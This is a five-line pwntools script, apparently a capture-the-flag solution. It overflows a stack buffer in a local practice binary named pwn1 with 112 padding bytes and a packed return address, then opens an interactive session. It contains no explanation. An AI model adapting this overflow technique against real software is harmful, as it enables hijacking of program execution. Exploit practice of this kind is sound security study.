from pwn import *
pwn1 = process('./pwn1')
target = 0x804863a
pwn1.sendline('A' * (112) + p32(target))
pwn1.interactive()
